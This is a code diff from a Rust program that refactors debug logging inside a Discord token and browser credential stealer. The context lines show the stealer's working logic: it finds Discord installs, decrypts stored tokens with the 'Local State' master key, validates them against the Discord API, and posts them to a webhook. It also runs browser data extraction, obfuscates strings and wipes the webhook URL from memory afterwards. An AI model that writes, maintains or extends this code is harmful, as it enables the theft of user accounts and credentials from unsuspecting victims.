@@ -158,8 +158,7 @@ fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     #[cfg(debug_assertions)]
     log::init();
-    #[cfg(debug_assertions)]
-    log::log("=== START ===");
+    logs!("=== START ===");
     browsers::chrome_inject::cleanup_legacy_artifacts();
 
     let p1 = obfstr!("https://discord.com/api/").to_string();
@@ -173,12 +172,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     for (name, path) in discord_paths {
         if !path.exists() {
-            #[cfg(debug_assertions)]
-            log::log(&format!("discord skip (missing): {name}"));
+            logf!("discord skip (missing): {name}");
             continue;
         }
-        #[cfg(debug_assertions)]
-        log::log(&format!("discord scan: {name} -> {}", path.display()));
+        logf!("discord scan: {name} -> {}", path.display());
 
         let local_state_path = path.join("Local State");
 
@@ -213,10 +210,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                     decrypt_token(&enc_data, &master_key)
                                                 {
                                                     if sent_tokens.insert(token.clone()) {
-                                                        #[cfg(debug_assertions)]
-                                                        log::log(&format!(
-                                                            "discord token found ({name})"
-                                                        ));
+                                                        logf!("discord token found ({name})");
                                                         if let Some(user) = vt(&client, &token).await {
                                                             let avatar_url = user
                                                                 .avatar
@@ -264,18 +258,16 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                                                 client.post(&wbh).json(&embed).send().await;
                                                             match response {
                                                                 Ok(resp) => {
-                                                                    #[cfg(debug_assertions)]
-                                                                    log::log(&format!(
+                                                                    logf!(
                                                                         "discord webhook token embed: HTTP {}",
                                                                         resp.status()
-                                                                    ));
+                                                                    );
                                                                     let _ = resp;
                                                                 }
                                                                 Err(err) => {
-                                                                    #[cfg(debug_assertions)]
-                                                                    log::log(&format!(
+                                                                    logf!(
                                                                         "discord webhook token embed ERR: {err}"
-                                                                    ));
+                                                                    );
                                                                     let _ = err;
                                                                 }
                                                             }
@@ -301,19 +293,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    #[cfg(debug_assertions)]
-    log::log(&format!("discord tokens sent: {}", sent_tokens.len()));
+    logf!("discord tokens sent: {}", sent_tokens.len());
 
-    #[cfg(debug_assertions)]
-    log::log("browser extraction start");
+    logs!("browser extraction start");
     match browsers::run(&client, &wbh).await {
         Ok(()) => {
-            #[cfg(debug_assertions)]
-            log::log("browser extraction OK");
+            logs!("browser extraction OK");
         }
         Err(e) => {
-            #[cfg(debug_assertions)]
-            log::log(&format!("browser extraction ERR: {e}"));
+            logf!("browser extraction ERR: {e}");
             let _ = e;
         }
     }
@@ -322,7 +310,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         std::ptr::write_bytes(wbh.as_mut_ptr(), 0, wbh.len());
     }
 
-    #[cfg(debug_assertions)]
-    log::log("=== DONE ===");
+    logs!("=== DONE ===");
     Ok(())
 }
